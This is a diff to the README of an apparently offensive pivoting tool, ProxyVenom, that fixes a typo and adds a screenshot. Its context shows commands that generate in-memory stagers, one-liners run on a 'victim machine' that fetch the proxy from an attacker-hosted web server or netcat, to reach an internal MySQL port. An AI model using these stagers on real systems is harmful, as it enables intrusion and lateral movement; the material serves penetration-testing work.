@@ -76,7 +76,7 @@ Once the proxy is executed on the victim machine and has successfully connected 
 `mysql -A -h 127.0.0.1 -P 3128 -u wordpress -p`
 
 ## Using Stagers
-Stagers allow you to deliver the payload using a basic command shell in simple ways. The above examples have focused on file delivery. However, ProxyVenom also supports HTTP, TCP, and command prompt delivery. These stagers generate a one-liner command that can be executed in your shell execute the proxy in memory. Stagers are named by the language-specific method used to implement the core functionality of the stager. For example, a python HTTP stager can use either the python requests library or the urllib library. The requests library may not be installed, but urllib is always present. You have the option to specify which one to use, but most stagers only have one option. Example:
+Stagers allow you to deliver the payload using a basic command shell in simple ways. The above examples have focused on file delivery. However, ProxyVenom also supports HTTP, TCP, and command prompt delivery. These stagers generate a one-liner command that can be executed in your shell to execute the proxy in memory. Stagers are named by the language-specific method used to implement the core functionality of the stager. For example, a python HTTP stager can use either the python requests library or the urllib library. The requests library may not be installed, but urllib is always present. You have the option to specify which one to use, but most stagers only have one option. Example:
 
 `python3 ProxyVenom/proxyvenom.py bind --lport 3128 --rhost 127.0.0.1 --rport 3306 py http -h`
 
@@ -87,6 +87,8 @@ Both the HTTP and TCP stagers require you to specify `--server-ip` and `--server
 `python3 ProxyVenom/proxyvenom.py bind --lport 3128 --rhost 127.0.0.1 --rport 3306 py http --server-ip 10.10.14.12 --server-port 8000 --stager urllib --outfile prx.py`
 
 As you can see, this generates a one-liner to execute in your shell on the victim machine in addition to the bind TCP proxy file. Start your web server, execute the one-liner, and the proxy will execute in memory on the victim machine. Using a TCP stager works very much the same way, but the file can be served with netcat and I/O redirection.
+
+<img width="1142" height="437" alt="Screenshot 2026-02-03 at 7 52 38 PM" src="https://github.com/user-attachments/assets/9e5a1464-eec2-4b77-a5f9-d86b9c909f62" />
 
 Finally, generating a prompt stager is done as follows:
 
